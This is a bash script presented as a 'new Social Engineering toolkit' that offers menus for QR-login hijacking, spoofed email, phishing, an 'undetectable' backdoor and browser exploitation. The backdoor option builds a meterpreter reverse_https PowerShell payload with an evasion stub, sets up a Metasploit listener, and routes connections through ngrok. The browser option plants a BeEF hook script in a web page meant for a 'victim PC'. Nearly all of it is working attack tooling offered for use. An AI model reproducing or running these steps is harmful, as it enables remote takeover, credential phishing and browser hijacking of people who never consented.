#!/bin/bash
#@M3-SEC

cd ~/set2/
cd temp/
rm temp.ps1
rm output.ps1
rm msf.rc
cd ..
cd output/
rm output.ps1
cd ..
clear
echo "                  ███████╗███████╗████████╗";
echo "                  ██╔════╝██╔════╝╚══██╔══╝";
echo "                  ███████╗█████╗     ██║   ";
echo "                  ╚════██║██╔══╝     ██║   ";
echo "                  ███████║███████╗   ██║ 2 ";
echo "                  ╚══════╝╚══════╝   ╚═╝   ";
echo "                  M3-Sec.        V: 0.02   ";
echo "     The new Social Engineering toolkit with new tools.";
echo ""
echo "1)      QR-Code Attacks"
echo "2)      Spoofmail"
echo "3)      Phishing"
echo "4)      Undetectable Backdoor"
echo "5)      Exploit Browser"
echo "0)      Exit"
read menu
if [[ $menu = 1 ]]; then
    cd ~/set2/tools/QrlJacking-Framework
    gnome-terminal -e "python QRLJacker.py" &
    sleep 2
    clear
    read -p "Press [ENTER] to go back to menu."
    cd ~/set2/
    ./set2.sh
elif [[ $menu = 2 ]]; then
    cd ~/set2/tools/spoofmail
    gnome-terminal -e ./spoofmail.sh &
    sleep 2
    clear
    read -p "Press [ENTER] to go back to menu."
    cd ~/set2/
    ./set2.sh
elif [[ $menu = 3 ]]; then
    cd ~/set2/tools/SocialFish
    gnome-terminal -e "python SocialFish.py" &
    sleep 2
    clear
    read -p "Press [ENTER] to continue."
    clear
    echo "Do you want to combine it with spoofmail?"
    echo "1 =   y"
    echo "2 =   n"
    read menu3
    if [[ $menu3 = 1 ]]; then
        cd ~/set2/tools/spoofmail
        gnome-terminal -e "./spoofmail" &
        sleep 2
        clear
        printf "\033[1m(YOU NEED TO ENTER THE NGORK ADRESS INSIDE THE BODY OF THE EMAIL!)\033[0m"
        read -p "Press [ENTER] to go back to menu."
        cd ~/set2/
        ./set2.sh
    elif [[ $menu3 = 2 ]]; then
        cd ~/set2/
        ./set2.sh
    fi
elif [[ $menu = 4 ]]; then
    clear
    echo "Do you want to do it over"
    echo "1)    WAN"
    echo "2)    LAN "
    read menu4
    if [[ $menu4 = 1 ]]; then
        clear    
        echo "Please enter the PORT you want to :"
        read LPORT
        ngrokip=$(resolveip -s 0.tcp.ngrok.io)
        LHOST=$(echo "127.0.0.1")
        cd tools/
        xterm -e "./ngrok tcp $LPORT" &
        clear 
        printf "\033[5m(DO NOT CLOSE THE NGROK WINDOW!)\033[0m"
        echo ""
        echo "Please enter that Port that ngrok gives you [0.tcp.ngrok.io:xxxx]  "
        read ngrokport
        cd ..
        cd temp/
        cat fud >> output.ps1
        echo "" >> output.ps1
        echo "" >> output.ps1
        echo "" >> output.ps1
        msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ngrokip LPORT=$ngrokport -f powershell -a x64 --platform windows > temp.ps1
        cat temp.ps1 >> output.ps1     
        echo "" >> output.ps1
        echo "" >> output.ps1
        echo "Invoke-ShellcodeMSIL -Shellcode @($buf)" >> output.ps1   
        mv output.ps1 ~/set2/output
        cd ..
        cd output/
        clear
        echo "Please copy the code that you see to the website, to get your exe."
        xterm -geometry 0x0 -e "firefox https://ps2exe.azurewebsites.net/" &
        xterm -geometry 0x0 -e "gedit output.ps1" &
        cd ..
        echo ""
        read -p "Press [ENTER] when you have done that."
        killall firefox gedit
        rm -rf output.ps1 temp.ps1
        clear
        echo "Do you want to start msfconsole?"
        echo "1 = yes"
        echo "2 = no"
        read msfy2
        if [[ $msfy2 = 2 ]]; then
        ./set2.sh
        elif [[ $msfy2 = 1 ]]; then
            cd temp
            rm msf.rc
            clear
            echo "use exploit/multi/handler" >> msf.rc
            echo "set PAYLOAD windows/x64/meterpreter/reverse_https" >> msf.rc
            echo "set LHOST $LHOST" >> msf.rc
            echo "set LPORT $LPORT" >> msf.rc
            echo "set exitonsession false" >> msf.rc
            echo "exploit -j" >> msf.rc
            msfconsole -r msf.rc
        fi
    elif [[ $menu4 = 2 ]]; then
        clear    
        echo "Please enter the IP :"
        read LHOST
        echo "Please enter the PORT :"
        read LPORT
        cd temp/
        cat fud >> output.ps1
        echo "" >> output.ps1
        echo "" >> output.ps1
        echo "" >> output.ps1        
        msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$LPORT LPORT=$LPORT -f powershell -a x64 --platform windows > temp.ps1
        cat temp.ps1 >> output.ps1     
        echo "" >> output.ps1
        echo "" >> output.ps1
        echo "Invoke-ShellcodeMSIL -Shellcode @($buf)" >> output.ps1
          
        mv output.ps1 ~/set2/output
        cd ..
        cd output/
        clear
        echo "Please copy the code that you see to the website, to get your exe."
        xterm -geometry 0x0 -e "firefox https://ps2exe.azurewebsites.net/" &
        xterm -geometry 0x0 -e "gedit output.ps1" &
        cd ..
        echo ""
        read -p "Press [ENTER] when you have done that."
        killall gedit firefox
        rm -rf output.ps1 temp.ps1
        clear
        echo "Do you want to start msfconsole?"
        echo "1 = yes"
        echo "2 = no"
        read msfy1
        if [[ $msfy1 = 2 ]]; then
        ./set2.sh
        elif [[ $msfy1 = 1 ]]; then
            cd temp
            rm msf.rc
            clear
            echo "use exploit/multi/handler" >> msf.rc
            echo "set PAYLOAD windows/x64/meterpreter/reverse_https" >> msf.rc
            echo "set LHOST $LHOST" >> msf.rc
            echo "set LPORT $LPORT" >> msf.rc
            echo "set exitonsession false" >> msf.rc
            echo "exploit -j" >> msf.rc
            msfconsole -r msf.rc
        fi
    fi



elif [[ $menu = 5 ]]; then
    clear
    echo "Do you want to do it over..."
    echo "1)   ...WAN"
    echo "2)   ...LAN"
    read menu5
    if [[ $menu5 = 1 ]]; then
    clear
    ngrokip=$(resolveip -s ngrok.com)
    cd tools/
    xterm -e ./ngrok http 3000 &
    cd ..
    cd /usr/share/beef-xss
    xterm ./beef &    
    cd /var/www/html
    rm index.html
    echo "Enter title of your website..."
    read title
    echo "Enter body of your website..."
    read body
    echo "<html>" >> index.html
    echo "<title> $title </title>" >> index.html
    echo "<body>" >> index.html
    echo "<script src='http://$ngrokip:3000/hook.js'></script>" >> index.html
    echo "$body" >> index.html
    echo "</body>" >> index.html
    echo "</html>" >> index.html
    clear
    service apache2 start
    printf "Now run "
    printf "\033[1mhttp://$ngrokip/\033[0m"
    printf " on the victim PC.  "
    echo ""
    xterm -geometry 0x0 -e firefox http://127.0.0.1:3000/ui/panel &
    read -p "Press [ENTER] to stop"
    killall ruby xterm
    service apache2 stop
    cd ~/set2/
    exit
    ./set2    
    elif [[ $menu5 = 2 ]]; then
    clear
    localip=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
    cd /usr/share/beef-xss
    xterm ./beef &    
    cd /var/www/html
    rm index.html
    echo "Enter title of your website..."
    read title
    echo "Enter body of your website..."
    read body
    echo "<html>" >> index.html
    echo "<title> $title </title>" >> index.html
    echo "<body>" >> index.html
    echo "<script src='http://$localip:3000/hook.js'></script>" >> index.html
    echo "$body" >> index.html
    echo "</body>" >> index.html
    echo "</html>" >> index.html
    clear
    service apache2 start
    printf "Now run "
    printf "\033[1mhttp://$localip/\033[0m"
    printf " on the victim PC. "
    printf "\033[1m(WARNING NOT WORKING ON WAN)\033[0m"
    echo ""
    xterm -geometry 0x0 -e firefox http://127.0.0.1:3000/ui/panel &
    read -p "Press [ENTER] to stop"
    killall ruby xterm
    service apache2 stop
    cd ~/set2/
    exit
    ./set2
    fi



elif [[ $menu = 0 ]]; then
    exit
else
    clear
    echo "?"
    ./set2.sh
fi
